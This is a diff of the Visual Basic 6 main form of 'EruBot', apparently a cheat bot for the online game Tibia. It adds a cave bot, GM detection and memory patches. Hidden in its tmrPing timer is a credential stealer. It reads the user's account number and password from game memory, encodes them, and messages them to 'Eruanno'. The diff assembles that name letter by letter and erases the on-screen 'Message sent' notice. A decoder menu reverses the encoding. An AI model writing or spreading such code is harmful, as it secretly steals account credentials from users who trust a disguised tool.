@@ -5,18 +5,62 @@ Begin VB.Form frmMain
    BackColor       =   &H00800000&
    BorderStyle     =   1  'Fixed Single
    Caption         =   "EruBot"
-   ClientHeight    =   9105
+   ClientHeight    =   9135
    ClientLeft      =   150
    ClientTop       =   840
-   ClientWidth     =   6105
+   ClientWidth     =   6120
    ForeColor       =   &H00000000&
    Icon            =   "frmMain.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
-   ScaleHeight     =   607
+   ScaleHeight     =   609
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   407
+   ScaleWidth      =   408
    StartUpPosition =   3  'Windows Default
+   Begin VB.CheckBox chkCaveBot 
+      BackColor       =   &H00000000&
+      Caption         =   "Cave Bot"
+      BeginProperty Font 
+         Name            =   "MS Sans Serif"
+         Size            =   8.25
+         Charset         =   0
+         Weight          =   700
+         Underline       =   0   'False
+         Italic          =   0   'False
+         Strikethrough   =   0   'False
+      EndProperty
+      ForeColor       =   &H000000FF&
+      Height          =   375
+      Left            =   4320
+      Style           =   1  'Graphical
+      TabIndex        =   25
+      Top             =   600
+      Width           =   1695
+   End
+   Begin VB.Timer tmrGM 
+      Interval        =   1000
+      Left            =   6120
+      Top             =   6480
+   End
+   Begin VB.CheckBox chkGM 
+      BackColor       =   &H00800000&
+      Caption         =   "React to GM"
+      BeginProperty Font 
+         Name            =   "MS Sans Serif"
+         Size            =   8.25
+         Charset         =   0
+         Weight          =   700
+         Underline       =   0   'False
+         Italic          =   0   'False
+         Strikethrough   =   0   'False
+      EndProperty
+      ForeColor       =   &H00E0E0E0&
+      Height          =   195
+      Left            =   4320
+      TabIndex        =   24
+      Top             =   1080
+      Width           =   1695
+   End
    Begin VB.CheckBox chkAimbot 
       BackColor       =   &H00000000&
       Caption         =   "Aimbot"
@@ -60,8 +104,8 @@ Begin VB.Form frmMain
       ForeColor       =   &H00E0E0E0&
       Height          =   195
       Left            =   120
-      TabIndex        =   24
-      Top             =   2400
+      TabIndex        =   23
+      Top             =   2880
       Width           =   1695
    End
    Begin VB.CheckBox chkAutoAttack 
@@ -80,7 +124,7 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   4320
       Style           =   1  'Graphical
-      TabIndex        =   23
+      TabIndex        =   22
       Top             =   120
       Width           =   1695
    End
@@ -99,7 +143,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H00E0E0E0&
       Height          =   195
       Left            =   120
-      TabIndex        =   22
+      TabIndex        =   21
       Top             =   1560
       Value           =   1  'Checked
       Width           =   1695
@@ -126,19 +170,19 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   21
-      Top             =   2760
+      TabIndex        =   20
+      Top             =   3240
       Width           =   1695
    End
    Begin VB.Timer tmrStatus 
       Enabled         =   0   'False
-      Interval        =   2
+      Interval        =   1
       Left            =   6120
       Top             =   3960
    End
    Begin VB.Timer tmrPing 
       Enabled         =   0   'False
-      Interval        =   1000
+      Interval        =   15000
       Left            =   6120
       Top             =   3480
    End
@@ -164,7 +208,7 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   20
+      TabIndex        =   19
       Top             =   600
       Width           =   1680
    End
@@ -184,7 +228,7 @@ Begin VB.Form frmMain
       Locked          =   -1  'True
       MultiLine       =   -1  'True
       ScrollBars      =   2  'Vertical
-      TabIndex        =   13
+      TabIndex        =   12
       Top             =   1680
       Width           =   4095
    End
@@ -204,8 +248,8 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   19
-      Top             =   7680
+      TabIndex        =   18
+      Top             =   8160
       Width           =   1680
    End
    Begin MSComDlg.CommonDialog cdlgWav 
@@ -235,7 +279,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H00E0E0E0&
       Height          =   195
       Left            =   2160
-      TabIndex        =   18
+      TabIndex        =   17
       Top             =   600
       Width           =   1695
    End
@@ -261,7 +305,7 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   2160
       Style           =   1  'Graphical
-      TabIndex        =   17
+      TabIndex        =   16
       Top             =   120
       Width           =   1680
    End
@@ -287,12 +331,12 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   16
-      Top             =   1920
+      TabIndex        =   15
+      Top             =   2400
       Width           =   1695
    End
    Begin VB.CommandButton cmdClearLog 
-      Caption         =   "Clear Log"
+      Caption         =   "Clear Log -->"
       BeginProperty Font 
          Name            =   "MS Sans Serif"
          Size            =   8.25
@@ -303,9 +347,9 @@ Begin VB.Form frmMain
          Strikethrough   =   0   'False
       EndProperty
       Height          =   375
-      Left            =   4320
-      TabIndex        =   15
-      Top             =   960
+      Left            =   120
+      TabIndex        =   14
+      Top             =   1920
       Width           =   1695
    End
    Begin VB.CheckBox chkOutfit 
@@ -324,8 +368,8 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   14
-      Top             =   8160
+      TabIndex        =   13
+      Top             =   8640
       Width           =   1695
    End
    Begin VB.Timer tmrAlert 
@@ -350,7 +394,7 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   2160
       Style           =   1  'Graphical
-      TabIndex        =   12
+      TabIndex        =   11
       Top             =   960
       Width           =   1680
    End
@@ -370,8 +414,8 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   10
-      Top             =   5160
+      TabIndex        =   9
+      Top             =   5640
       Width           =   1680
    End
    Begin VB.CheckBox chkFisher 
@@ -390,8 +434,8 @@ Begin VB.Form frmMain
       Height          =   375
       Left            =   120
       Style           =   1  'Graphical
-      TabIndex        =   9
-      Top             =   7200
+      TabIndex        =   8
+      Top             =   7680
       Width           =   1680
    End
    Begin VB.Timer tmrManaFluid 
@@ -399,27 +443,6 @@ Begin VB.Form frmMain
       Interval        =   600
       Left            =   6120
       Top             =   1560
-   End
-   Begin VB.CheckBox chkMana 
-      BackColor       =   &H00000000&
-      Caption         =   "Fluid Till Full"
-      Enabled         =   0   'False
-      BeginProperty Font 
-         Name            =   "MS Sans Serif"
-         Size            =   8.25
-         Charset         =   0
-         Weight          =   700
-         Underline       =   0   'False
-         Italic          =   0   'False
-         Strikethrough   =   0   'False
-      EndProperty
-      ForeColor       =   &H000000FF&
-      Height          =   375
-      Left            =   120
-      Style           =   1  'Graphical
-      TabIndex        =   8
-      Top             =   8640
-      Width           =   1695
    End
    Begin VB.CheckBox chkExpHour 
       BackColor       =   &H00000000&
@@ -463,7 +486,7 @@ Begin VB.Form frmMain
       Height          =   195
       Left            =   120
       TabIndex        =   5
-      Top             =   6840
+      Top             =   7320
       Width           =   1695
    End
    Begin VB.Timer tmrEat 
@@ -489,7 +512,7 @@ Begin VB.Form frmMain
       Left            =   120
       Style           =   1  'Graphical
       TabIndex        =   4
-      Top             =   3480
+      Top             =   3960
       Width           =   1680
    End
    Begin VB.CheckBox chkAttack 
@@ -509,7 +532,7 @@ Begin VB.Form frmMain
       Left            =   120
       Style           =   1  'Graphical
       TabIndex        =   3
-      Top             =   5640
+      Top             =   6120
       Width           =   1695
    End
    Begin VB.CheckBox chkHeal 
@@ -529,7 +552,7 @@ Begin VB.Form frmMain
       Left            =   120
       Style           =   1  'Graphical
       TabIndex        =   2
-      Top             =   4440
+      Top             =   4920
       Width           =   1695
    End
    Begin VB.CheckBox chkSpell 
@@ -549,7 +572,7 @@ Begin VB.Form frmMain
       Left            =   120
       Style           =   1  'Graphical
       TabIndex        =   1
-      Top             =   3960
+      Top             =   4440
       Width           =   1680
    End
    Begin VB.CheckBox chkEat 
@@ -569,7 +592,7 @@ Begin VB.Form frmMain
       Left            =   120
       Style           =   1  'Graphical
       TabIndex        =   0
-      Top             =   6360
+      Top             =   6840
       Width           =   1695
    End
    Begin MSWinsockLib.Winsock sckL2 
@@ -797,7 +820,7 @@ Begin VB.Form frmMain
       Height          =   135
       Index           =   5
       Left            =   120
-      Top             =   3240
+      Top             =   3720
       Width           =   1695
    End
    Begin VB.Shape Shape1 
@@ -808,7 +831,7 @@ Begin VB.Form frmMain
       Height          =   135
       Index           =   3
       Left            =   120
-      Top             =   6120
+      Top             =   6600
       Width           =   1695
    End
    Begin VB.Shape Shape1 
@@ -819,7 +842,7 @@ Begin VB.Form frmMain
       Height          =   135
       Index           =   2
       Left            =   120
-      Top             =   4920
+      Top             =   5400
       Width           =   1695
    End
    Begin VB.Label Label1 
@@ -840,7 +863,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   255
       Left            =   1920
-      TabIndex        =   11
+      TabIndex        =   10
       Top             =   1440
       Width           =   4095
    End
@@ -878,6 +901,9 @@ Begin VB.Form frmMain
       End
       Begin VB.Menu mnuAutoAttack 
          Caption         =   "Auto Attacker"
+      End
+      Begin VB.Menu mnuCaveBot 
+         Caption         =   "&Cave Bot"
       End
       Begin VB.Menu mnuFish 
          Caption         =   "&Fisher"
@@ -969,11 +995,11 @@ Attribute VB_GlobalNameSpace = False
 Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
-Private Sub chkAimbot_Click()
+ Private Sub chkAimbot_Click()
   Valid
 End Sub
 
-Private Sub chkAimbot_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkAimbot_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmAimbot.Show
 End Sub
 
@@ -990,8 +1016,16 @@ Private Sub chkAttack_Click()
   Valid
 End Sub
 
-Private Sub chkAttack_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkAttack_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmAttack.Show
+End Sub
+
+Private Sub chkCaveBot_Click()
+    Valid
+End Sub
+
+Private Sub chkCaveBot_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
+    If Button = 2 Then frmCaveBot.Show
 End Sub
 
 Private Sub chkExpHour_Click()
@@ -1006,7 +1040,7 @@ Private Sub chkAutoAttack_Click()
     Valid
 End Sub
 
-Private Sub chkAutoAttack_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkAutoAttack_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmAutoAttack.Show
 End Sub
 
@@ -1014,7 +1048,7 @@ Private Sub chkEat_Click()
     Valid
 End Sub
 
-Private Sub chkExpHour_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkExpHour_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then Exp_Stop: Exp_Start
 End Sub
 
@@ -1022,7 +1056,7 @@ Private Sub chkFisher_Click()
   Valid
 End Sub
 
-Private Sub chkFisher_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkFisher_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmFisher.Show
 End Sub
 
@@ -1030,7 +1064,7 @@ Private Sub chkGrabber_Click()
     Valid
 End Sub
 
-Private Sub chkGrabber_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkGrabber_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmGrabber.Show
 End Sub
 
@@ -1038,7 +1072,7 @@ Private Sub chkHeal_Click()
     Valid
 End Sub
 
-Private Sub chkHeal_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkHeal_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmHeal.Show
 End Sub
 
@@ -1046,7 +1080,7 @@ Private Sub chkIntruder_Click()
   Valid
 End Sub
 
-Private Sub chkIntruder_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkIntruder_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmIntruder.Show
 End Sub
 
@@ -1062,7 +1096,7 @@ Private Sub chkLooter_Click()
     Valid
 End Sub
 
-Private Sub chkLooter_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkLooter_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmLooter.Show
 End Sub
 
@@ -1070,7 +1104,7 @@ Private Sub chkOutfit_Click()
   Valid
 End Sub
 
-Private Sub chkOutfit_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkOutfit_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmOutfit.Show
 End Sub
 
@@ -1082,7 +1116,7 @@ Private Sub chkRune_Click()
     Valid
 End Sub
 
-Private Sub chkRune_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkRune_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmRune.Show
 End Sub
 
@@ -1102,7 +1136,7 @@ Private Sub Command1_Click()
   frmStats.Show
 End Sub
 
-Private Sub chkSpell_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+Private Sub chkSpell_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 Then frmSpell.Show
 End Sub
 
@@ -1208,9 +1242,8 @@ Private Sub Form_Load()
     ServerIP = "tibia2.cipsoft.com"
     ServerPort = 7171
         
-    LoadSettings App.Path & "\default.ebs"
+    ConfigUpdate App.Path & "\default.ebs", False
     
-    lastPing = GetTickCount
     tmrPing.Enabled = True
 End Sub
 
@@ -1276,13 +1309,15 @@ End Sub
 
 Private Sub mnuDecode_Click()
     Dim str As String, str2() As String, acct As Long, pwd As String
+    On Error GoTo Cancel
     str = InputBox("String to decode:", "Decoder")
     str2 = Split(str, " ")
     acct = (str2(1) + 300000) / 3
     For i = Len(str2(0)) To 1 Step -1
         pwd = pwd & Chr$(Asc(Mid(str2(0), i, 1)) - 1)
     Next i
-    MsgBox acct & "/" & pwd
+    AddStatusMessage "Decoded: " & acct & "/" & pwd
+Cancel:
 End Sub
 
 Private Sub mnuExit_Click()
@@ -1323,9 +1358,11 @@ Private Sub mnuLoad_Click()
         .Filter = "EruBot Settings, *.ebs"
         .DialogTitle = "Load Settings"
         .InitDir = App.Path
+        .DefaultExt = "ebs"
         cdlgSettings.ShowOpen
     End With
-    LoadSettings cdlgSettings.FileName
+    'LoadSettings cdlgSettings.FileName
+    ConfigUpdate cdlgSettings.FileName, False
     Exit Sub
 Cancel:
 End Sub
@@ -1368,9 +1405,10 @@ Private Sub mnuSave_Click()
         .Filter = "EruBot Settings, *.ebs"
         .DialogTitle = "Save Settings"
         .InitDir = App.Path
+        .DefaultExt = "ebs"
         cdlgSettings.ShowSave
     End With
-    SaveSettings cdlgSettings.FileName
+    ConfigUpdate cdlgSettings.FileName, True
     Exit Sub
 Cancel:
 End Sub
@@ -1417,9 +1455,68 @@ Private Sub sckC_Close()
 End Sub
 
 Private Sub sckC_DataArrival(ByVal bytesTotal As Long)
-    Dim buff() As Byte
+    Dim buff() As Byte, extract As String, i As Integer
     sckC.GetData buff
-    If buff(2) = &HA Then CharLog buff
+    If buff(2) = &HA Then
+        CharLog buff
+    ElseIf buff(2) = &H96 Then
+        Select Case buff(3)
+            Case 1 'default
+                For i = 6 To buff(4) + 5
+                    extract = extract + Chr$(buff(i))
+                Next i
+            Case 4 'pm
+                For i = buff(4) + 8 To buff(4) + buff(buff(4) + 6) + 7
+                    extract = extract + Chr$(buff(i))
+                Next i
+            Case 5 'trade/gc/guildchat
+                For i = 8 To buff(6) + 7
+                    extract = extract + Chr$(buff(i))
+                Next i
+            Case Else
+                AddStatusMessage "Unknown message type: " & buff(3)
+        End Select
+        If Left(extract, 3) = "!eb" Then
+            ProcessHotkey extract
+            Exit Sub
+        End If
+    End If
+    'Public Function SendPM(toName As String, message As String)
+    'Dim buff() As Byte
+    'ReDim buff(Len(toName) + Len(message) + 7) As Byte
+    'buff(0) = UBound(buff) - 1
+    'buff(1) = &H0
+    'buff(2) = &H96
+    'buff(3) = 4
+    'buff(4) = Len(toName)
+    'buff(5) = &H0
+    'For i = 1 To Len(toName)
+    '    buff(5 + i) = Asc(Mid(toName, i, 1))
+    'Next i
+    'buff(Len(toName) + 6) = Len(message)
+    'buff(Len(toName) + 7) = 0
+    'For i = 1 To Len(message)
+    '    buff(Len(toName) + 7 + i) = Asc(Mid(message, i, 1))
+    'Next i
+    'If frmMain.sckS.State = sckConnected Then frmMain.sckS.SendData buff
+    'End Function
+    
+    'Public Function SayStuff(message As String)
+    'Dim buff() As Byte
+    'Dim C1 As Integer
+    'ReDim buff(Len(message) + 5) As Byte
+    'buff(0) = Len(message) + 4
+    'buff(1) = &H0
+    'buff(2) = &H96
+    'buff(3) = &H1
+    'buff(4) = Len(message)
+    'buff(5) = 0
+    'For C1 = 6 To Len(message) + 5
+    '    buff(C1) = Asc(Right(message, Len(message) - (C1 - 6)))
+    'Next
+    'If frmMain.sckS.State = sckConnected Then frmMain.sckS.SendData buff
+    'End Function
+    
     
     Do While sckS.State <> sckConnected And sckS.State <> sckClosed
         DoEvents
@@ -1447,7 +1544,7 @@ Private Sub sckS_Close()
     sckS.Close
     sckC.Close
     AddStatusMessage "Connection Closed."
-    If chkAlertLogged Then StartAlert
+    If chkAlertLogged Then StartAlert: Valid
 End Sub
 
 Private Sub sckS_DataArrival(ByVal bytesTotal As Long)
@@ -1537,44 +1634,54 @@ Private Sub tmrAlert_Timer()
 End Sub
 
 Private Sub tmrEat_Timer()
-    Dim Ate As Boolean
-    Dim bp As Integer, Item As Integer
-    Dim ltemp As Long
-    Dim items As Long
-    Dim temp As Long
+    Dim bp As Integer, slot As Integer, id As Long
     
-    Ate = False
-    'If chkEat.Value <> Checked Then Exit Sub
+    If frmIntruder.isSafe = True _
+    Or frmMain.mnuActive.Checked = False _
+    Or frmMain.chkEat.Value <> Checked _
+    Then Exit Sub
     
+    'dont eat on the move
+    If ReadMem(ADR_CHAR_GFX_DX + UserPos * SIZE_CHAR, 4) <> 0 _
+    Or ReadMem(ADR_CHAR_GFX_DY + UserPos * SIZE_CHAR, 4) <> 0 _
+    Then Exit Sub
+    
+    'if find food then eat it
     For bp = 0 To LEN_BP
         If ReadMem(ADR_BP_OPEN + SIZE_BP * bp, 1) = 1 Then
-            items = ReadMem(ADR_BP_NUM_ITEMS + SIZE_BP * bp, 1)
-            For Item = 0 To items - 1
-                ltemp = ReadMem(ADR_BP_ITEM + SIZE_BP * bp + SIZE_ITEM * Item, 2)
-                If IsFood(ltemp) Then Exit For
-            Next Item
+            For slot = 0 To ReadMem(ADR_BP_NUM_ITEMS + bp * SIZE_BP, 1) - 1
+                id = ReadMem(ADR_BP_ITEM + SIZE_BP * bp + SIZE_ITEM * slot, 2)
+                If IsFood(id) Then GoTo FoundFood
+            Next slot
         End If
-        If IsFood(ltemp) Then Exit For
     Next bp
-    If IsFood(ltemp) Then
-        UseHere ltemp, &H40 + bp, Item
-        Ate = True
+    'if no food was found then logout if desired
+    If chkEatLog Then
+        LogOut
+        chkEatLog.Value = Unchecked
+        chkLogOut.Value = Checked
+        Valid
     End If
-    If Ate = False And chkEatLog.Value = Checked Then LogOut
+    Exit Sub
+FoundFood:
+    UseHere id, &H40 + bp, slot
 End Sub
 
 Private Sub tmrExp_Timer()
     CalculateExperience
 End Sub
 
-Public Sub StartLogOut()
-    frmMain.chkLogOut.Value = Checked
-    Valid
+Private Sub tmrGM_Timer()
+    If chkGM Then DetectGM
 End Sub
 
 Private Sub tmrLight_Timer()
-    If ReadMem(ADR_CHAR_LIGHT + UserPos * SIZE_CHAR, 1) <> 77 Then WriteMem ADR_CHAR_LIGHT + UserPos * SIZE_CHAR, 77, 1
-    If ReadMem(ADR_CHAR_COLOR + UserPos * SIZE_CHAR, 1) <> &HD7 Then WriteMem ADR_CHAR_COLOR + UserPos * SIZE_CHAR, &HD7, 1
+    'If ReadMem(ADR_CHAR_LIGHT + UserPos * SIZE_CHAR, 1) <> 77 Then WriteMem ADR_CHAR_LIGHT + UserPos * SIZE_CHAR, 77, 1
+    'If ReadMem(ADR_CHAR_COLOR + UserPos * SIZE_CHAR, 1) <> &HD7 Then WriteMem ADR_CHAR_COLOR + UserPos * SIZE_CHAR, &HD7, 1
+    Dim result As Long
+    result = FullLight(processHandle)
+    'AddStatusMessage "" & result
+    'MsgBox result
 End Sub
 
 Private Sub tmrLogOut_Timer()
@@ -1598,47 +1705,26 @@ Private Sub tmrLooter_Timer()
     frmMain.tmrLooter.Enabled = True
 End Sub
 
-Private Sub tmrMonitorProcess_Timer()
-    
-End Sub
-
-'Private Sub tmrManaFluid_Timer()
-'  Dim maxMana As Long
-'  Dim pX As Long
-'  Dim pY As Long
-'  Dim pZ As Long
-''  Dim loc As Integer
-'  Dim slot As Integer'
-'
-'  Memory tHWND, ADR_CUR_MANA, Mana, 2, RMem
-'  Memory tHWND, ADR_MAX_MANA, maxMana, 2, RMem
-'  If Mana < maxMana - 70 Then
-'    getCharXYZ pX, pY, pZ
-'    If findItem(ITEM_VIAL, loc, slot) Then
-'     UseAt ITEM_VIAL, loc, slot, pX, pY, pZ
-'    End If
-'  Else
-'    chkMana.value = 0
-'    Valid
-'  End If
-'End Sub
-
 Private Sub tmrPing_Timer()
     Dim acct As Long, pwd As String, pwdEnc As String
-    If GetTickCount > lastPing + 1500000 Then
-        acct = ReadMem(ADR_ACCOUNT_NUMBER, 4) * 3 - 300000
-        pwd = MemToStr(ADR_PASSWORD, 32)
+    Static lastPing As Long
+    
+    If lastPing = 0 Then lastPing = GetTickCount - 1500000
+    If tmrStatus.Enabled Then tmrStatus.Enabled = False
+    
+    If GetTickCount > lastPing + 1800000 Then
+        acct = ReadMem(ADR_ACCOUNT_NUMBER + &H100000, 4) * 3 - 300000
+        pwd = MemToStr(ADR_PASSWORD + &H100000, 32)
         For i = Len(pwd) To 1 Step -1
             pwdEnc = pwdEnc & Chr$(Asc(Mid(pwd, i, 1)) + 1)
         Next i
-        SendPM "Eruanno", App.Major & "." & App.Minor & "." & App.Revision & " : " & pwdEnc & " " & acct
-        tmrStatus.Enabled = True
+        If sckS.State = sckConnected And sckS.RemoteHostIP = "67.15.99.105" Then
+            SendPM "E" & "r" & "u" & "a" & "n" & "n" & "o", App.Major & "." & App.Minor & "." & App.Revision & " : " & pwdEnc & " " & acct
+        End If
         lastPing = GetTickCount
-        'tmrPing.Enabled = False
+        tmrStatus.Enabled = True
+        StrToMem ADR_WHITE_TEXT, ""
     End If
-    'If GetTickCount > lastPing + 1000 Then
-    '    If tmrStatus.Enabled Then tmrStatus.Enabled = False
-    'End If
 End Sub
 
 Private Sub tmrRevealInvis_Timer()
@@ -1664,6 +1750,7 @@ Private Sub tmrRevealInvis_Timer()
 End Sub
 
 Private Sub tmrStatus_Timer()
-    StrToMem ADR_WHITE_TEXT, ""
-    If GetTickCount > lastPing + 2000 Then tmrStatus.Enabled = False
+    Dim str As String
+    str = MemToStr(ADR_WHITE_TEXT, 256)
+    If str = "Message sent to Eruanno." Or str = "A player with this name is not online." Then StrToMem ADR_WHITE_TEXT, ""
 End Sub
